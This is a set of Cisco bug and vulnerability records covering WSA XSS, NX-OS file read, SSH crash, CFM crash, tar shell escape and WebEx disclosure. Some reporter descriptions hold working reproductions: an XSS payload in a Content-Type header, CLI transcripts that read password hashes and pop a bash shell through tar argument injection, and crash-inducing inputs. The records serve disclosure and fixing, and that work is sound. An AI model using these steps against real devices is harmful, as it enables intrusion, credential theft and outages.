Title: XSS in Web Tracking report, via a Content-Type response header
RNE: Symptom: A vulnerability in the Administrator report page of the Cisco Web Security Appliance could allow an unauthenticated, remote attacker to execute a cross-site scripting (XSS) attack. The vulnerability is due to insufficient input validation.  An attacker could exploit this vulnerability by convincing the WSA user to visit a malicious website.  Conditions: Devices running an affected version of the Web Security Appliance.  Workaround: None.    PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-0623 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: Cross-site scripting (XSS) is a type of vulnerability which allows a malicious actor to run script (e.g., JavaScript) within the web client. Upon a user viewing a page that displays the script content, various actions can be carried out on the user's behalf. These actions might include configuring a new administrative user or changing the viewing user's password. The result of this attack can then be leveraged by the malicious user to gain unauthorized access to the system.A malicious server can send a crafted Content-Type response header to a WSA end user, whichwill trigger an XSS bug in the reporting web GUI. This particular XSS issue is exploitable byunauthenticated remote users.In the admin GUI menu, browse to "Reporting - Web Tracking"(https://wsa/monitor/reporting_services/tracking_search). Set the "Time Range" fieldappropriately, then click the "Search" button. For each row in the HTML table of access log entries,the server IP address is displayed. The Content-Type response header is only visible by clickingto bring up the detail view, but the HTML of the Content-Type header is always present in the page.An example attack vector is if an HTTP server responds to a WSA end user with a Content-Typeheader of: img/src="/"onerror="alert(1)". When an admin views the "Web Tracking" report'ssearch results, a JavaScript alert will be triggered. This was tested in Internet Explorer 8,and Firefox 26.0 on Linux.There is some filtering of Content-Type; for example, it's truncated after spaces, null bytes, andsemicolons. The Content-Type is also truncated in the access log (viewed via the CLI's `tail`command). Additionally, script tags appear to be defanged on the web client: they appear in thebrowser's DOM, but do not execute code. However, this filtering is not enough to prevent XSS.Viewing the Web Tracking report in the web UI, when it contains an HTTP response with acrafted Content-Type header, can lead to an XSS exploit. It is not necessary for the adminto expand the row containing the malicious Content-Type field; the report merely needsto be loaded in the browser.For general guidance on preventing XSS, please refer to the OWASP guide onXSS prevention: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_SheetIn addition to HTML output encoding, further anti-XSS measures should be put into place.For example, a good defense-in-depth technology is the Content Security Policy header:https://www.owasp.org/index.php/Content_Security_Policy andhttps://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
PSIRT: PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT. Title: Cisco NX-OS System Software CLI Arbitrary File Read Vulnerability
RNE: Symptom: A vulnerability in the command-line interface (CLI) of Cisco NX-OS System Software could allow an authenticated, local attacker to read the contents of arbitrary files.  The vulnerability is due to insufficient input validation for a specific CLI command. An attacker could exploit this vulnerability by issuing a crafted command on the CLI. An exploit could allow the attacker unauthorized access to read arbitrary files on the underlying local file system.  Note: On products that support multiple Virtual Device Contexts (VDC) this could allow an attacker to read files from any VDC.  Conditions: None  Workaround: There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171129-nxos6  Further Problem Description: For information about vulnerable and not vulnerable software releases, and time frame for fixed software releases, please open a support case with your support organization. PSIRT does not provide or maintain this information for Medium SIR advisories.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-12338 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The "bloggerd parse log-buffer file" CLI command contains a vulnerability, whichallows a user to read arbitrary files from the Linux filesystem.  In fact, thehelp text reveals the vulnerability by explicitly requesting that users enter aLinux filesystem path.    n7700-vdc-2# bloggerd parse log-buffer file ?      WORD  Linux path to file/directory (Eg: /bootflash/abc)      WORD  Linux path to file (Eg: /bootflash/abc)The following CLI transcript shows how a VDC user ("vdc-admin" role) is able toread the startup configuration, which contains password hashes for moreprivileged users ("network-admin" role).  As a result, of this activity theattacker may be able to crack the password and escalate privileges to"network-admin," thereby escaping the VDC.    n7700-vdc-2# show version | grep version    the GNU General Public License (GPL) version 2.0 or the GNU      BIOS:      version 3.1.0      kickstart: version 8.1(1)      system:    version 8.1(1)      System version: 8.1(1)    n7700-vdc-2# # show the privileges of the currently logged in user    n7700-vdc-2# show users    NAME     LINE         TIME         IDLE          PID COMMENT    vdc2-admin     pts/0        Apr 25 21:33   .         14356 (10.1.1.100) session=ssh *    n7700-vdc-2# show user-account vdc2-admin    user:vdc2-admin            this user account has no expiry date            roles:vdc-admin    n7700-vdc-2# # use the exploit to get a network-admin password hash    n7700-vdc-2# bloggerd parse log-buffer file /var/sysmgr/startup-cfg/ascii/system.cfg | grep username    username admin password 5 $5$Ogz0W9/D$kIz9nMSWZmT55B2crNheoNy96IL6l1Ry0HS.jwGJqiA  role network-admin    username network-admin password 5 $5$B5uFRCiJ$qPWxwUjB1o3GibXbDvMqpQi86Nj4QoT4Mylx8osNXJB  role network-adminSimilarly, an attacker can use this vulnerability to directly read filesassociated with other VDCs by specifying their Linux filesystem path.    n7700-vdc-2# show vdc current-vdc    Current vdc is 2 - vdc-2    n7700-vdc-2# show file bootflash:/vdc3_data.txt    /bootflash/vdc_2/vdc3_data.txt: No such file.    n7700-vdc-2# bloggerd parse log-buffer file /bootflash/vdc_3/vdc3_data.txt | grep vdc3    Parsing file: /bootflash/vdc_3/vdc3_data.txt                  Symbol Name: file belongs to vdc3.    This file belongs to vdc3.    This file belongs to vdc3.    This file belongs to vdc3.    This file belongs to vdc3.    This file belongs to vdc3.To address this issue, developers must ensure that user-supplied input (such asfile paths) are properly restricted.References:http://cwe.mitre.org/data/definitions/37http://cwe.mitre.org/data/definitions/73http://cwe.mitre.org/data/definitions/538http://cwe.mitre.org/data/definitions/552http://cwe.mitre.org/data/definitions/862http://cwe.mitre.org/data/definitions/269

Title: CVE-2009-1386 : SSLVPN : crash at ssl3_do_change_cipher_spec with DTLS
RNE: Symptoms: Cisco IOS Software includes a version of OpenSSL that is affected by the vulnerabilities identified by the following Common Vulnerability and  Exposures (CVE) IDs:   CVE-2009-1386  This bug was opened to address the potential impact on this product.  Conditions: Device configured with SSLVPN and cmdsvc dtls/cmd  Workaround: Disable DTSL with cmdno svc dtls/cmd  Further Problem Description: This problem would only be seen in Cisco IOS when using Anyconnect client with Cisco IOS SSLVPNs, after the initial session has been authenticated  and established.  Exploitation would result in Cisco IOS reloading.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  6.3/5.2: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:S/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2009-1386 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Vlan tagged LACP in IRB BD takes down local LACP session on Ether-Bundle
RNE: Symptoms: LACP PDU(s) received on Vlan tagged bundle AC is punted. This interferes untagged LACP session on local  bundle. It brings down local LACP session.  Conditions: When users mistakenly let tagged LACP traffic into IRB bridge domain.  Workaround: Use MAC ACL on the L2  bundle sub-interface to filter out tagged LACP.  Further Problem Description: N/A  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 2.9/2.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:M/Au:N/C:N/I:N/A:P/E:F/RL:OF/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

flap).

Title: Cisco WebEx Meetings Server Information Disclosure Vulnerability
RNE: Symptom: A vulnerability in Cisco WebEx Meetings Server could allow unauthenticated, remote attackers to gain information that could allow them to access scheduled customer meetings.  The vulnerability is due to an incomplete configuration of the robots.txt file on customer-hosted WebEx solutions and a lack of activation of the Short URL functionality. Note that the Short URL functionality is provided in all releases of Cisco WebEx Meetings Server after version 2.5MR4. An attacker could exploit this vulnerability via an exposed parameter to search for indexed meeting information. A successful exploit could allow the attacker to obtain scheduled meeting information and potentially allow the attacker to attend scheduled, customer meetings.  Cisco has released software updates that address this vulnerability. Workarounds are available to address this vulnerability. This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170510-cwms  Conditions: A customer site running any currently supported Cisco WebEx Meetings Server release (2.5, 2.6, 2.7, or 2.8).  Cisco-hosted WebEx deployments are NOT impacted by this vulnerability.  Workaround: Customers can enable the Short URL functionality for their individual releases by following the steps outlined below. NOTE: Once Short URL is activated, all previously scheduled meetings become invalid. Customers must reschedule all past recurring meetings. It is also recommended that customers change their meeting passwords when rescheduling for added security protections.  To enable Short URL functionality in Release 2.5: http://www.cisco.com/c/en/us/td/docs/collaboration/CWMS/2_5/Administration_Guide/Administration_Guide/Administration_Guide_chapter_01111.html#task_E8A47834C9C140ADA3E05809DF253F11  To enable Short URL functionality in Release 2.6: http://www.cisco.com/c/en/us/td/docs/collaboration/CWMS/2_6/Administration_Guide/Administration_Guide/Administration_Guide_chapter_01110.html#task_E8A47834C9C140ADA3E05809DF253F11  To enable Short URL functionality in Release 2.7: http://www.cisco.com/c/en/us/td/docs/collaboration/CWMS/2_7/Administration_Guide/cwms_b_cwms-administration-2-7/cwms_b_cwms-administration-2-7_chapter_01110.html#task_E8A47834C9C140ADA3E05809DF253F11  To enable Short URL functionality in Release 2.8: http://www.cisco.com/c/en/us/td/docs/collaboration/CWMS/2_8/Administration_Guide/cwms_b_cwms-administration-2-8/cwms_b_cwms-administration-2-8test_chapter_01110.html#task_E8A47834C9C140ADA3E05809DF253F11  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6651 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Dear Cisco Security Team,I would like to report a vulnerability in one of your applications whichis " Cisco WebEx " Name of the vulnerability : Auth bypassing.The vulnerability is all about accessing the Meetings information andthen use the information to join the meetings .************************************************************What are the meetings information ? 1- Time of the meeting2- Subject of the meeting 3- The hoster of the meeting 4- The meeting number5- The Audio Connections 6- The Access Code 7- The password of the meeting ( if it was setted-up by the hoster ) ************************************************************How to access the meetings information ? The whole story is about finding the paramter " ?MeetingKey= " .. if youare able to get the MeetingKey then you will be able to get theinformation .************************************************************How to join to the meetings ? Well if you got the information of the meeting then you will be able tojoin the meetings .. please note that you are going to download a ciscoprogram & an extension in your browser .. and also you have to be usingone of two operating systems which are : windows & mac . ************************************************************How to fix this vulnerabiltiy ?Well in my opinion is that you should let the users have an accounts notonly the hoster .. you have to give each and everyone a username &password so that they can access the meetings .. and if anyone want toget the information of any meetings it should be redirected to the loginpage !! ************************************************************Thank you

Title: SSHv2 spurious memory access
RNE: The Secure Shell server (SSH) implementation in Cisco IOS contains multiple vulnerabilities that allow unauthenticated users the ability to generate a spurious memory access error or, in certain cases, reload the device.   The IOS SSH server is an optional service that is disabled by default, but its use is highly recommended as a security best practice for management of Cisco IOS devices. SSH can be configured as part of the AutoSecure feature in the initial configuration of IOS devices, AutoSecure run after initial configuration, or manually. Devices that are not configured to accept SSH connections are not affected by these vulnerabilities.  Common Vulnerabilities and Exposures (CVE) identifier CVE-2008-1159 has been assigned to this bug.  The Security Advisory for this issue is posted at http://www.cisco.com/warp/public/707/cisco-sa-20080521-ssh.shtml
Description: CSCsk42419 "ssh : crash" has not been fixed correctly.==================================================================Initial email :==================================================================From: Xavier Brouckaert (xabrouck) Sent: Monday, September 24, 2007 4:50 PMTo: Varun Tewari (vtewari)Cc: email-in(mailer list); Brent Chapman (brchapma)Subject: Re: CSCsk42419(CSC.sys,A-R,vtewari)ssh : crash (SR 606726325)Varun,I could easily crash your image with the fix with "ssh -lxabrouck:10000000000 router" (it crashed by watchdog timeout) :System was restarted by watchdog timer expired 3700 Software(C3745-ADVENTERPRISEK9-M), Experimental Version12.4(20070918:104129) [vtewari-CSCsk42419 110] Compiled Fri 21-Sep-0702:13 by vtewari Image text-base: 0x60008930, data-base: 0x63621930Stack trace from system failure:FP: 0x6761C3F0, RA: 0x62F9053CFP: 0x6761C4A8, RA: 0x62F821B8FP: 0x6761C4D0, RA: 0x62ACEA8CFP: 0x6761C4E8, RA: 0x62ACEA70I don't understand why you replace	if (MODEMS[port_no]-tty_busymsg) {by	if (MODEMS[port_no] && MODEMS[port_no]-tty_busymsg) {I would have done :	if ((port_no=0) && (port_noPLATFORM_MAXLINES) &&	MODEMS[port_no] && MODEMS[port_no]-tty_busymsg) {You say "This seems to be a day 1 high sev issue in SSH." in PRRQ.It's not really true because it doesn't happen before the commit of CSCse76056. Did you read all the enclosures in the bug ?Can you rollback your commit, or is it too late and we have to open another bug ?Your fix looks like a quick hack and we're dealing with a big security hole.  It's scary to say the least.Why is there no comment from the code reviewers in PRRQ ?Why didn't the static analysis find that no boundary check was done on the MODEMS array ?thanks,Xavier=========================================================Answer from DE:=========================================================Watchdog timeout is a different issue.Plz file a new bug, and assign that to me.Will take a look.Anyways plz keep ur setup ready, as I have just now shifted office soall my local labs are not in place. Regards, Varun +91-80-4154-1965

Title: ASR1k:IOSd crash by sh ethernet cfm errors
RNE: Symptom: IOSd crash on Exec process  Conditions: Running show ethernet cfm errors after receiving a malformed CFM packet (See also Cisco Bug ID: CSCuq93406)  Workaround: Do not execute the command show ethernet cfm errors.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  4.4/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:M/Au:S/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  This is a complete fix for the issue described in CVE ID CVE-2014-3409.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: .txtIOSd crash by running "show ethernet cfm errors" after receiving a malformed CFM packet.This was seen on 15.4(3)S1 which includes the fix of CSCuq93406 as well as a latest internal build, The step to hit this issue is as follows;1) Replace null string in the MD name field of the malformed packet and send it out,2) Running " show ethernet cfm errors " and the box crashes on IOSd.Traceback summary-----------------% 0x7fe4c53402ef : __be_sstrncpy% 0x7fe4c69bd86d : __be_show_ecfm_cc_svlan_errors % 0x7fe4c69bd3ec : __be_show_ecfm_cc_errors % 0x7fe4c6a14cca : __be_show_ecfm_cmd % 0x7fe4c31a9cf4 : __be_parse_call_action_func % 0x7fe4c31a8d9d : __be_parse_cmd_internal % 0x7fe4c31a708a : __be_parse_cmd % 0x7fe4c73560d9 : __be_parser_entry % 0x7fe4c31c49a0 : __be_execTo see this, at least one remote maintenance point is necessary. Otherwise, nothing happens.BTW, if the original malformed packet(which MD name is NOT nulled out) is used instead, "show ethernet cfm errors" gives garbled output;@imi1GWSW13-1#show ethernet cfm errors@--------------------------------------------------------------------------------@MPID Domain Id                                   Mac Address      Type Id       @     MA Name                                     Reason           Lvl  Age      @     Local MEP Info                                                             @--------------------------------------------------------------------------------@76   L7.A^[                                      f4d9.fb28.1503   BD-V 3506     @     ^Y#NZQVkQ^Y^]Yvc^T^\#'vV                        Crossconnect Err 7    6s@     N/A@----------------------------------------Finally summarizing the attachements here; - core ;  - Decode of the core - crashinfo - sh tech which includes mininum config to see this.   Peering device has same config other than mpid. - Malformed CFM packet;When you use this, you need to change the src mac to one of the peering device.

Title: vdc-admin on N7K VDC can execute shell commands using tar
RNE: Symptoms: Cisco Nexus devices running an affected version of Cisco NX-OS software contain a local privilege escalation vulnerability within the command line interpreter (CLI) that could  allow an authenticated, local attacker to execute arbitrary commands on the underlying operating system with user privileges.  The vulnerability exists due to insufficient input sanitization of parameters passed to the tar command on the CLI of an affected device.  An attacker could leverage this behavior to  execute arbitrary commands on the underlying operating system with the privileges of the user authenticated to the device.  Conditions: Cisco Nexus devices running an affected version of Cisco NX-OS software.  Workaround: Not available.  Further Problem Description:  Credit: Cisco would like to thank Jens Krabbenhoeft for discovering and reporting this vulnerability.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:L/Au:S/C:P/I:P/A:P/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-4232 has been assigned to this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Copied from customer's email and confirmed by lab testing.---Example commands/session:First of all create some strange looking files:rt-inet-30-011# echo A  bootflash:-Lrt-inet-30-011# echo A  bootflash:70rt-inet-30-011# echo A  bootflash:-Mrt-inet-30-011# echo A  bootflash:-Frt-inet-30-011# echo A  bootflash:bashrt-inet-30-011# echo A  bootflash:1Now, create a file that is "large" enough:rt-inet-30-011# show run  bootflash:runAnd afterwards use following CLI command:rt-inet-30-011# tar create a.tar run -L 1 -M -F bashThe intention of this command from CLI perspective would be to pack all files given after "a.tar" into this tar file. Unfortunately the script in /isan/bin/vsh-tar.sh executes tar blindly like this:     tar $tar -f $afile $compress $verbose $remove $absolute $rfiles 2&1 | grep -v "tar: Removing leading" | sed $sed_rem_vdcWhere we have following variable substitutions:$tar is "-c" from "create"$afile is "a.tar" $compress, $verbose, $remove, $absolute are unused (those are cli parameters we don't set)$rfiles is the list of relative pathes to the files we want to tar, it's generated here: # check files to be added to archive exist rfiles="" for f in $files; do     # remove current working dir part of file name (make relative)     rfiles="$rfiles ${f#$wd}"     test -f $f && continue     echo "file $f does not exist" | sed $sed_rem_vdc     err=1 doneThis will expand to 'run' '-L' '1 '-M' '-F' 'bash'. For GNU tar it is possible to give parameters after the file list. This gets abused in following way: -M instructs tar to make multiple tars (back in the old days where big files needed to be distributed over multiple tapes) in chunks (-L) of 1 * 1024 byte blocks. When given '-F bash' tar is also instructed to run the command 'bash' after tar switched to another one of those chunks.You probably already got what is happening: After the first 1024 bytes long tar file is created "bash" is executed from $PATH. This leads to a bash shell with user rights (that unfortunately is with buffered IO so if you test this, just do some random "ls -la" inbetween to get the buffer full). Outcome: (because of the buffered output more or less) interactive bash session with user-rights. Elevation of rights can be done using various techniques.A proposal for a fix from my side: Run tar with "--" before $rfiles to tell tar to stop processing parameters:     tar $tar -f $afile $compress $verbose $remove $absolute -- $rfiles 2&1 | grep -v "tar: Removing leading" | sed $sed_rem_vdc
